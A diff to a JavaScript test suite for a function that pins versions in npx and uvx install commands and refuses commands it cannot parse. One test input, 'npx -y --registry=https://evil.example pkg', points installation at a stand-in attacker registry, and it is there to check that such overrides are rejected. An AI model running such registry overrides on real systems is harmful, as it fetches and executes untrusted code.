@@ -396,18 +396,24 @@ test('isExactVersion: the two ecosystems have different rules', () => {
 });
 
 test('pinInstallCmd: refuses commands the gate itself cannot parse', () => {
-  // Flags before the package name: the old parser pinned "--cache" and the
-  // gate checked a package that does not exist.
-  for (const cmd of ['npx -y --cache /tmp/c pkg', 'npx -y --package pkg server']) {
+  // An option we do not know may take a value, so the package cannot be told
+  // from it — the old regex pinned "--cache" and the gate checked a package
+  // that does not exist. A registry override changes the artifact itself.
+  for (const cmd of ['npx -y --frobnicate /tmp/c pkg', 'npx -y --registry=https://evil.example pkg']) {
     const r = o.pinInstallCmd(cmd, '1.2.3');
     assert.equal(r.pinned, false, cmd);
-    assert.match(r.reason, /not a plain `npx -y <pkg>` command/);
+    assert.match(r.reason, /cannot read the package from this npx command/);
   }
   for (const cmd of ['uvx --with extra server', 'uvx --from git+https://x/y z']) {
     const r = o.pinInstallCmd(cmd, '1.2.3');
     assert.equal(r.pinned, false, cmd);
-    assert.match(r.reason, /not a plain `uvx <pkg>` command/);
+    assert.match(r.reason, /cannot read the package from this uvx command/);
   }
+});
+
+test('pinInstallCmd: known npx options and --package are read, and the right token is pinned', () => {
+  assert.deepEqual(o.pinInstallCmd('npx -y --cache /tmp/c pkg', '1.2.3').parts, ['npx', '-y', '--cache', '/tmp/c', 'pkg@1.2.3']);
+  assert.deepEqual(o.pinInstallCmd('npx -y --package pkg server', '1.2.3').parts, ['npx', '-y', '--package', 'pkg@1.2.3', 'server']);
 });
 
 test('pinInstallCmd: a digest in some other argument is not a pin on the image', () => {
